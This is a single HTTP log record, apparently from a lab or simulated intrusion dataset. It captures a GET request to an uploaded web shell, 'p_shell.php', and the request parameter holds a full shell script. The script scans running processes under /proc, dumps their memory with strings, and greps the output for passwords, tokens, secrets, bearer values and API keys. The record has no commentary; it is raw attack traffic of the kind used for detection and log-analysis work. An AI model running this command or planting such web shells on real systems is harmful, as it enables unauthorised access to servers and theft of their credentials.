{"ts":1795065975.632797,"uid":"C7RzSc2uCO7CB7flr8","id.orig_h":"10.10.1.100","id.orig_p":38050,"id.resp_h":"10.10.10.40","id.resp_p":80,"trans_depth":1,"method":"GET","host":"10.10.10.40","uri":"/uploads/p_shell.php?c={ \necho '--- /proc mem scrape (credential access) ---'\nfor pid in $(ls /proc 2>/dev/null | grep '^[0-9]' | head -8); do\n  f=/proc/${pid}/maps\n  [ -r \"${f}\" ] || continue\n  name=$(cat /proc/${pid}/comm 2>/dev/null)\n  grep -q 'heap' \"${f}\" 2>/dev/null || continue\n  echo \"pid=${pid} comm=${name}\"\n  timeout 1 strings /proc/${pid}/mem 2>/dev/null     | grep -aiE 'password|pass=|token|secret|bearer|api_key'     | head -3\ndone\necho proc_mem_scrape_done\n; }; rc=$?; printf '\\n__PHANTOM_RC_30702_29682:%s\\n' \"$rc\"","version":"1.1","user_agent":"curl/8.20.0","request_body_len":0,"response_body_len":0,"status_code":200,"status_msg":"OK","tags":[]}
